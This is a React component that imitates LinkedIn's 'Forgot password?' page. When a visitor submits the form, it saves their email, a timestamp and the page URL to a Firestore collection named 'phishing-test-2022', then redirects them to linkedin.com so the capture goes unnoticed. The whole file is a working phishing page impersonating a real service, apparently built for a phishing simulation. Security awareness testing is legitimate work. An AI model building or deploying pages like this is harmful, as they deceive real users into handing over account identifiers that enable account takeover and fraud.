import React, { useState } from "react";
import styled from "styled-components";
import InputBox from "./InputBox.js";
import NavBar from "./NavBar.js";
import { Link } from "react-router-dom";
import Button from "./Button";
import { db } from "../firebase.js";
import { collection, addDoc } from "firebase/firestore";



const ForgotPage = () => {
  const [input, setInput] = useState({
    email: "",
    password: "",
  });
  const handleChangeInput = (e) => {
    setInput((prev) => {
      return {
        ...prev,
        [e.target.name]: e.target.value,
      };
    });
  };

  function clickRedirect()
  {
    window.location.href="https://linkedin.com/feed/";
  }

  const handleSubmit = async () => {



    console.log(input.email);
    // pass to firebase
    const dbRef = collection(db, "phishing-test-2022");
    const params = {
      email: input.email,
      created_at: new Date(),
      from: window.location.href,
    };
    await addDoc(dbRef, params);
   
  };

const sendRequest=() =>
{
  handleSubmit();
  clickRedirect();
}
  return (
    <div>
      <NavBar></NavBar>
      <div>
      <Box>
        <Text1>
          <h1>Forgot password?</h1>
        </Text1>

        <Text2>
          <p>Reset password in two quick steps</p>
        </Text2>

        <InputBox
          label="Email or phone number"
          type="text"
          name="email"
          value={input.email}
          onChange={handleChangeInput}
        />

        <FButton onClick={sendRequest}>Reset password</FButton>
        <br></br>
        <Back as= {Link} to= "/">Back</Back>
      </Box>
      <Bottom>
        <img src="/images/linkedin-bottom2.png" alt="" />
      </Bottom>
      </div>
    </div>
  );
};

const Text1 = styled.label`
  display: flex;

  h1 {
    display: block;
    font-size: 40px;
    line-height: 1.25;
    font-weight: 600;
    color: rgba(0, 0, 0, 0.9);
    padding: 0 0 4px 4px;
  }
`;

const Text2 = styled.label`
  p {
    display: block;
    font-size: 18px;
    line-height: 1.42857;
    font-weight: 400;
    color: rgba(0, 0, 0, 0.9);
    padding-left: 8px;
    margin-bottom: 20px;
  }
`;

const Box = styled.div`
  align-items: center;
  margin-left: 450px;
  margin-top: 100px;
  width: 30%;
  height: 270px;
  padding: 20px;
  background-color: white;
  border-radius: 20px;
  box-shadow: 0 4px 12px rgba(0,0,0,0.15);

`;

const FButton = styled(Button)`
font-size: 16px;
`;


const Back = styled.button`

  border-radius: 5px;
  background-color: white;
  cursor: pointer;
  border: none;
  font-size: 20px;
  color: rgba(0, 0, 0, 0.6);
  margin: 150px;
  justify-content: center;
  align-items: center;
  

  &:hover {
    color: #242526;
    text-decoration: underline;
    cursor: pointer;
    background-color: #d3d3d3;
    border-radius: 20px;
  }
`;

const Bottom = styled.div`
  img {
    position: absolute;
    width: 100%;

    margin-top: 420px;
  }
`;

export default ForgotPage;
